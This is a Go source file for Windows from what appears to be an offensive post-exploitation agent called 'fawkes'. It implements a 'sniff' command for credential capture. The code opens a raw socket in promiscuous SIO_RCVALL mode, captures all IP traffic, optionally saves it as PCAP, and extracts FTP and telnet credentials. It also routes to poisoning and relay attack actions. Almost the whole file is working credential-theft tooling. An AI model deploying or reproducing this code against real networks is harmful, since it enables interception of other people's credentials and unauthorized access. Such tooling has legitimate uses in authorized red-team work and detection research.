//go:build windows

package commands

import (
	"fmt"
	"net"
	"strings"
	"syscall"
	"time"
	"unsafe"

	"fawkes/pkg/structs"
)

type SniffCommand struct{}

func (c *SniffCommand) Name() string { return "sniff" }
func (c *SniffCommand) Description() string {
	return "Passive network sniffing for credential capture (T1040)"
}

const (
	sioRCVALL  = 0x98000001
	rcvallOn   = 1
	rcvallOff  = 0
	ipprotoIP  = 0
	sockRaw    = 3
	afInet     = 2
	solSocket  = 0xFFFF
	soRCVTIMEO = 0x1006
)

func (c *SniffCommand) Execute(task structs.Task) structs.CommandResult {
	params, parseErr := requireParams[sniffParams](task)
	if parseErr != nil {
		return *parseErr
	}

	if params.Action == "poison" {
		return c.executePoison(task)
	}
	if params.Action == "relay" {
		return c.executeRelay(task)
	}
	if params.Action == "ldap-relay" {
		return executeLDAPRelayCore(task)
	}

	ports := sniffApplyDefaults(&params)

	// Find the local IP to bind to
	bindIP := sniffResolveBindIP(params.Interface)
	if bindIP == nil {
		return errorf("No suitable network interface found. Specify an interface name or IP address.")
	}

	// Create raw socket
	fd, err := syscall.Socket(afInet, sockRaw, ipprotoIP)
	if err != nil {
		return errorf("Failed to create raw socket (need Administrator): %v", err)
	}
	defer syscall.Closesocket(fd)

	// Bind to the local IP
	sa := &syscall.SockaddrInet4{Port: 0}
	copy(sa.Addr[:], bindIP.To4())
	if err := syscall.Bind(fd, sa); err != nil {
		return errorf("Bind to %s failed: %v", bindIP, err)
	}

	result := &sniffResult{}

	// Enable SIO_RCVALL to capture all IP traffic
	inBuf := uint32(rcvallOn)
	var bytesReturned uint32
	err = syscall.WSAIoctl(
		fd,
		sioRCVALL,
		(*byte)(unsafe.Pointer(&inBuf)),
		uint32(unsafe.Sizeof(inBuf)),
		nil,
		0,
		&bytesReturned,
		nil,
		0,
	)
	if err != nil {
		return errorf("SIO_RCVALL failed (need Administrator + Windows Firewall may interfere): %v", err)
	}
	defer func() {
		off := uint32(rcvallOff)
		syscall.WSAIoctl(fd, sioRCVALL, (*byte)(unsafe.Pointer(&off)),
			uint32(unsafe.Sizeof(off)), nil, 0, &bytesReturned, nil, 0)
	}()

	// Set receive timeout (1 second)
	timeout := int32(1000) // milliseconds
	syscall.SetsockoptInt(fd, solSocket, soRCVTIMEO, int(timeout))

	ftpTracker := &sniffFTPTracker{pending: make(map[string]string)}
	telnetTracker := &sniffTelnetTracker{pending: make(map[string]string)}
	var pcapCollector *sniffPCAPCollector
	if params.SavePCAP {
		pcapCollector = newSniffPCAPCollector(params.MaxBytes)
	}
	deadline := time.Now().Add(time.Duration(params.Duration) * time.Second)
	startTime := time.Now()
	buf := make([]byte, 65536)

	for !task.DidStop() && time.Now().Before(deadline) && result.BytesCaptured < params.MaxBytes {
		n, err := syscall.Read(fd, buf)
		if err != nil {
			if isTimeoutError(err) {
				continue
			}
			result.Errors = append(result.Errors, fmt.Sprintf("read: %v", err))
			break
		}
		if n == 0 {
			continue
		}

		result.PacketCount++
		result.BytesCaptured += int64(n)

		if pcapCollector != nil {
			pcapCollector.addPacket(buf[:n])
		}

		// Windows raw sockets deliver IP packets directly (no ethernet header)
		pkt := sniffParseIPPacket(buf[:n])
		if pkt == nil {
			continue
		}
		if !sniffMatchPort(ports, pkt.Meta.SrcPort, pkt.Meta.DstPort) {
			continue
		}
		sniffExtractCredentials(pkt.Payload, &pkt.Meta, result, ftpTracker, telnetTracker)
	}

	return sniffFinalizeResult(&task, result, startTime, pcapCollector, 101)
}

// sniffResolveBindIP finds the IP address to bind the raw socket to.
// Accepts an interface name (e.g. "Ethernet") or IP address string, or empty for auto-detect.
func sniffResolveBindIP(iface string) net.IP {
	// If given an IP address directly, use it
	if ip := net.ParseIP(iface); ip != nil {
		return ip.To4()
	}

	// If given an interface name, look up its IPv4 address
	if iface != "" {
		ifi, err := net.InterfaceByName(iface)
		if err == nil {
			addrs, _ := ifi.Addrs()
			for _, addr := range addrs {
				if ipnet, ok := addr.(*net.IPNet); ok && ipnet.IP.To4() != nil && !ipnet.IP.IsLoopback() {
					return ipnet.IP.To4()
				}
			}
		}
		// Try partial match on interface name (Windows names can be long)
		ifaces, _ := net.Interfaces()
		ifaceLower := strings.ToLower(iface)
		for _, ifi := range ifaces {
			if strings.Contains(strings.ToLower(ifi.Name), ifaceLower) {
				addrs, _ := ifi.Addrs()
				for _, addr := range addrs {
					if ipnet, ok := addr.(*net.IPNet); ok && ipnet.IP.To4() != nil && !ipnet.IP.IsLoopback() {
						return ipnet.IP.To4()
					}
				}
			}
		}
		return nil
	}

	// Auto-detect: find the first non-loopback IPv4 interface
	ifaces, err := net.Interfaces()
	if err != nil {
		return nil
	}
	for _, ifi := range ifaces {
		if ifi.Flags&net.FlagUp == 0 || ifi.Flags&net.FlagLoopback != 0 {
			continue
		}
		addrs, _ := ifi.Addrs()
		for _, addr := range addrs {
			if ipnet, ok := addr.(*net.IPNet); ok && ipnet.IP.To4() != nil && !ipnet.IP.IsLoopback() {
				return ipnet.IP.To4()
			}
		}
	}
	return nil
}

func isTimeoutError(err error) bool {
	// WSAETIMEDOUT = 10060, WSAEWOULDBLOCK = 10035
	if errno, ok := err.(syscall.Errno); ok {
		return errno == 10060 || errno == 10035
	}
	return false
}
